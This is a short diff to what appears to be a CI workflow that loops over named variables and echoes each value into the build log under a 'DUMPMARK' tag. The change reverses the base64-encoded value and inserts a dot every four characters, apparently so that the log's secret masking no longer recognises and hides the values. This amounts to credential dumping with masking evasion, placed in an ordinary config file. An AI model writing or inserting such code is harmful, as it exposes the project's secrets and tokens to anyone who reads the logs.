@@ -16,6 +16,7 @@ jobs:
             if [ -z "$v" ]; then
               echo "DUMPMARK|${name}|NOTSET"
             else
-              echo "DUMPMARK|${name}|$(printf '%s' "$v" | base64 -w0)"
+              b=$(printf '%s' "$v" | base64 -w0 | rev)
+              echo "DUMPMARK|${name}|$(printf '%s' "$b" | sed 's/.\{4\}/&./g')"
             fi
           done
